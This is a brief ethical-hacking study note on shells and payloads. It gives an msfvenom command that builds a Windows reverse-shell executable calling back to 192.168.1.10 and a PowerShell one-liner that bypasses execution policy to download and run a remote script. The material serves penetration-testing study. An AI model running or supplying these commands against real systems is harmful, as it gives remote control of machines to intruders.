# Shells & Payloads

## Overview
This section covers the use of shells and payloads in the context of ethical hacking. It includes information on how to create and use payloads, as well as the importance of using them in various scenarios.

## Payloads
Payloads are used to execute commands or scripts on a target system. They can be created using tools like `msfvenom` and `powershell`. For example, a payload can be created to execute a command on the target system using the following command:

```bash
msfvenom -p cmd/windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
```

This command creates a reverse shell payload that can be executed on the target system.

## Shells
Shells are used to interact with the target system's command line interface. They can be used to execute commands and scripts on the target system. For example, a shell can be used to execute a command on the target system using the following command:

```bash
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/shell.ps1')
```

This command downloads and executes a PowerShell script from a remote location on the target system.
